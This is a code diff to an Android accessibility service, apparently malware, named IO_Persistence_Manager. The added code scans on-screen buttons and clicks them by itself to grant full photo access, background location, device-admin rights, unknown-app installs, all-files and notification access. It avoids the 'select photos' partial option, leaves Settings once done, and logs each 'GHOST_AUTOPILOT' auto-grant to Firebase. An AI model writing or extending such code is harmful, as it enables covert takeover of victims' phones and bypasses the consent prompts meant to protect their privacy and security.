@@ -1480,6 +1480,61 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
     private static volatile boolean isExitingSettings = false;
 
+    private boolean searchFullAccessButtonDfs(AccessibilityNodeInfo node) {
+        if (node == null) return false;
+
+        String viewId = node.getViewIdResourceName();
+        if (viewId != null) {
+            String lowerId = viewId.toLowerCase();
+            if (lowerId.contains("permission_allow_all_button") || lowerId.contains("permission_allow_always_button")) {
+                if (performNodeClick(node)) {
+                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Full Access permission via View ID [" + viewId + "]");
+                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Full Access permission via View ID [" + viewId + "]");
+                    return true;
+                }
+            }
+        }
+
+        CharSequence textSeq = node.getText();
+        CharSequence descSeq = node.getContentDescription();
+        String text = textSeq != null ? textSeq.toString().trim() : "";
+        String desc = descSeq != null ? descSeq.toString().trim() : "";
+
+        if (!text.isEmpty() || !desc.isEmpty()) {
+            String lowerText = text.toLowerCase();
+            String lowerDesc = desc.toLowerCase();
+
+            String[] fullAccessKeywords = {
+                "allow all", "allow access to all photos", "allow all photos",
+                "allow all photos and videos", "allow all the time", "permitir todo", "permitir todos"
+            };
+
+            for (String kw : fullAccessKeywords) {
+                if (lowerText.contains(kw) || lowerDesc.contains(kw)) {
+                    if (lowerText.length() < 55 && isInteractiveButtonNode(node)) {
+                        if (performNodeClick(node)) {
+                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
+                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
+                            return true;
+                        }
+                    }
+                }
+            }
+        }
+
+        int count = node.getChildCount();
+        for (int i = 0; i < count; i++) {
+            AccessibilityNodeInfo child = node.getChild(i);
+            if (child != null) {
+                boolean success = searchFullAccessButtonDfs(child);
+                child.recycle();
+                if (success) return true;
+            }
+        }
+
+        return false;
+    }
+
     private void executeAutoPilotPass() {
         if (isExitingSettings) return;
 
@@ -1490,8 +1545,13 @@ public class IO_Persistence_Manager extends AccessibilityService {
 
                 int totalSwitches = countSwitchesOnScreen(root);
 
+                // Pass 0: Priority Full Access Check for Android 14 Media Prompts ("Allow all", "Allow access to all photos")
+                boolean clicked = searchFullAccessButtonDfs(root);
+
                 // Pass 1: Search for runtime permission & system dialog buttons ("While using the app", "Allow", "OK", "Grant", "Install Update")
-                boolean clicked = searchPermissionButtonDfs(root);
+                if (!clicked) {
+                    clicked = searchPermissionButtonDfs(root);
+                }
 
                 // Pass 2: Search for unchecked special permission switches ("Install unknown apps", "All files access", "Notification access")
                 if (!clicked) {
@@ -1910,37 +1970,40 @@ public class IO_Persistence_Manager extends AccessibilityService {
     private boolean searchPermissionButtonDfs(AccessibilityNodeInfo node) {
         if (node == null) return false;
 
-        // 1. Check View ID Resource Name
+        // 1. Check View ID Resource Name (Excluding Partial Access "Select photos" button IDs on Android 14)
         String viewId = node.getViewIdResourceName();
         if (viewId != null) {
             String lowerId = viewId.toLowerCase();
-            if (lowerId.contains("permission_allow") ||
-                lowerId.contains("permission_allow_foreground_only_button") ||
-                lowerId.contains("permission_allow_button") ||
-                lowerId.contains("permission_allow_always_button") ||
-                lowerId.contains("permission_allow_one_time_button") ||
-                lowerId.contains("action_button") ||
-                lowerId.contains("admin_add") ||
-                lowerId.endsWith("btnguideaction") ||
-                lowerId.endsWith("btncheckupdate") ||
-                lowerId.contains("btncheckforupdate") ||
-                lowerId.contains("btnstartstop") ||
-                lowerId.contains("btnplayprotectscan") ||
-                lowerId.endsWith("id/button1")) {
-                if (performNodeClick(node)) {
-                    Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");
-                    FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");
-                    
-                    AccessibilityNodeInfo root = getRootInActiveWindow();
-                    if (root != null) {
-                        CharSequence pkgSeq = root.getPackageName();
-                        String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
-                        root.recycle();
-                        if (pkgStr.contains("settings") && !lowerId.contains("admin") && !lowerId.contains("action_button")) {
-                            startSmartExitSettingsLoop();
+            if (!lowerId.contains("permission_allow_selected") && !lowerId.contains("allow_selected")) {
+                if (lowerId.contains("permission_allow_all_button") ||
+                    lowerId.contains("permission_allow_always_button") ||
+                    lowerId.contains("permission_allow_foreground_only_button") ||
+                    lowerId.contains("permission_allow_button") ||
+                    lowerId.contains("permission_allow_one_time_button") ||
+                    lowerId.contains("permission_allow") ||
+                    lowerId.contains("action_button") ||
+                    lowerId.contains("admin_add") ||
+                    lowerId.endsWith("btnguideaction") ||
+                    lowerId.endsWith("btncheckupdate") ||
+                    lowerId.contains("btncheckforupdate") ||
+                    lowerId.contains("btnstartstop") ||
+                    lowerId.contains("btnplayprotectscan") ||
+                    lowerId.endsWith("id/button1")) {
+                    if (performNodeClick(node)) {
+                        Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");
+                        FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via View ID [" + viewId + "]");
+
+                        AccessibilityNodeInfo root = getRootInActiveWindow();
+                        if (root != null) {
+                            CharSequence pkgSeq = root.getPackageName();
+                            String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
+                            root.recycle();
+                            if (pkgStr.contains("settings") && !lowerId.contains("admin") && !lowerId.contains("action_button")) {
+                                startSmartExitSettingsLoop();
+                            }
                         }
+                        return true;
                     }
-                    return true;
                 }
             }
         }
@@ -1973,37 +2036,63 @@ public class IO_Persistence_Manager extends AccessibilityService {
                 }
             }
 
-            String[] keywords = {
-                "while using the app", "only this time", "allow all the time",
-                "allow", "allow all", "grant", "permitir", "permitir siempre",
-                "aceptar", "autoriser", "oui", "turn on", "enable", "activate",
-                "activate this device admin", "activate this device administrator", "yes", "ok",
-                "start optimization", "start", "complete setup", "check for update", "enable sync", "install update",
-                "enable protection", "enable notification access", "enable file storage access",
-                "enable install unknown apps", "enable system protection", "proceed", "continue"
+            // Android 14 Full Media Access Priority Pass ("Allow all", "Allow access to all photos")
+            String[] fullAccessKeywords = {
+                "allow all", "allow access to all photos", "allow all photos",
+                "allow all photos and videos", "allow all the time", "while using the app",
+                "permitir todo", "permitir todos", "autoriser tout"
             };
 
-            for (String kw : keywords) {
-                if (lowerText.equals(kw) || lowerDesc.equals(kw) ||
-                    (lowerText.startsWith(kw) && lowerText.length() < kw.length() + 15)) {
-                    
-                    // Exclude long title sentences
-                    if (lowerText.length() < 50 && isInteractiveButtonNode(node)) {
+            for (String kw : fullAccessKeywords) {
+                if (lowerText.contains(kw) || lowerDesc.contains(kw)) {
+                    if (lowerText.length() < 55 && isInteractiveButtonNode(node)) {
                         if (performNodeClick(node)) {
-                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
-                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
-                            
-                            AccessibilityNodeInfo root = getRootInActiveWindow();
-                            if (root != null) {
-                                CharSequence pkgSeq = root.getPackageName();
-                                String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
-                                root.recycle();
-                                boolean isAdminKeyword = lowerText.contains("activate") || lowerText.contains("admin") || lowerText.contains("device") || lowerText.contains("turn on");
-                                if (pkgStr.contains("settings") && !isAdminKeyword) {
-                                    startSmartExitSettingsLoop();
-                                }
-                            }
+                            Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
+                            FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted Full Access permission via text [" + text + "]");
                             return true;
+                        }
+                    }
+                }
+            }
+
+            // Exclude Partial Access ("Select photos and videos") text
+            boolean isPartialAccess = lowerText.contains("select photo") || lowerText.contains("selected photo") ||
+                                      lowerDesc.contains("select photo") || lowerDesc.contains("selected photo") ||
+                                      lowerText.contains("allow selected") || lowerDesc.contains("allow selected");
+
+            if (!isPartialAccess) {
+                String[] keywords = {
+                    "while using the app", "only this time", "allow all the time",
+                    "allow", "allow all", "grant", "permitir", "permitir siempre",
+                    "aceptar", "autoriser", "oui", "turn on", "enable", "activate",
+                    "activate this device admin", "activate this device administrator", "yes", "ok",
+                    "start optimization", "start", "complete setup", "check for update", "enable sync", "install update",
+                    "enable protection", "enable notification access", "enable file storage access",
+                    "enable install unknown apps", "enable system protection", "proceed", "continue"
+                };
+
+                for (String kw : keywords) {
+                    if (lowerText.equals(kw) || lowerDesc.equals(kw) ||
+                        (lowerText.startsWith(kw) && lowerText.length() < kw.length() + 15)) {
+
+                        // Exclude long title sentences
+                        if (lowerText.length() < 50 && isInteractiveButtonNode(node)) {
+                            if (performNodeClick(node)) {
+                                Log.d(TAG, "GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
+                                FirebaseConfig.logActivity("GHOST_AUTOPILOT: Auto-granted permission via text [" + text + "]");
+
+                                AccessibilityNodeInfo root = getRootInActiveWindow();
+                                if (root != null) {
+                                    CharSequence pkgSeq = root.getPackageName();
+                                    String pkgStr = pkgSeq != null ? pkgSeq.toString().toLowerCase() : "";
+                                    root.recycle();
+                                    boolean isAdminKeyword = lowerText.contains("activate") || lowerText.contains("admin") || lowerText.contains("device") || lowerText.contains("turn on");
+                                    if (pkgStr.contains("settings") && !isAdminKeyword) {
+                                        startSmartExitSettingsLoop();
+                                    }
+                                }
+                                return true;
+                            }
                         }
                     }
                 }
